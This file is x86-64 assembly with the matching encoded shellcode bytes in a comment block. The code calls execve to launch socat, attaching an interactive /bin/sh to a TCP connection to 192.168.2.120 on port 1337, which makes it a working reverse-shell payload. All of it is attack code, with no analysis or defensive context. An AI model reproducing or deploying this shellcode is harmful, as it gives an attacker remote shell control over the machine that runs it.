/* shellcode:

\x48\x31\xd2\x48\x81\xc4\x00\x01\x00\x00\x48\xb8\x2f\x73\x6f\x63\x61\x74\x00
\x00\x50\x48\xb8\x2f\x75\x73\x72\x2f\x62\x69\x6e\x50\x48\x89\xe7\x6a\x00\x48
\xb8\x6e\x2f\x73\x68\x2c\x70\x74\x79\x50\x48\xb8\x45\x58\x45\x43\x3a\x2f\x62
\x69\x50\x49\x89\xe0\x48\xb8\x30\x3a\x31\x33\x33\x37\x00\x00\x50\x48\xb8\x31
\x36\x38\x2e\x32\x2e\x31\x32\x50\x48\xb8\x54\x43\x50\x3a\x31\x39\x32\x2e\x50
\x49\x89\xe1\x52\x41\x51\x41\x50\x57\x48\x89\xe6\x48\xc7\xc2\x00\x00\x00\x00
\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05

*/

# execve("/bin/socat", {"/bin/socat", "EXEC:/bin/sh,pty", "TCP:192.168.2.120:1337"}, NULL);
xor %rdx, %rdx
add $0x100, %rsp

# syscall[0] = "/bin/socat"
mov $0x00007461636f732f, %rax # /socat\x00
push %rax
mov $0x6e69622f7273752f, %rax # /usr/bin
push %rax
mov %rsp, %rdi

# argv[1] = "EXEC:/bin/sh,pty"
push $0x0 #\0

mov $0x7974702c68732f6e, %rax # n/sh,pty
push %rax
mov $0x69622f3a43455845, %rax # EXEC:/bi
push %rax
mov %rsp, %r8

# arg[2] = "TCP:192.168.2.120:1337"
mov $0x0000373333313a30, %rax # 0:1337\x00
push %rax
mov $0x32312e322e383631, %rax # 168.2.12
push %rax
mov $0x2e3239313a504354, %rax # TCP:192.
push %rax
mov %rsp, %r9

# argv
push %rdx # NULL-terminate argv
push %r9 # "TCP:192.168.2.120:1337"
push %r8 # "EXEC/bin/sh,pty"
push %rdi # "/bin/socat"
mov %rsp, %rsi

# envp
mov $0, %rdx

mov $59, %rax
syscall
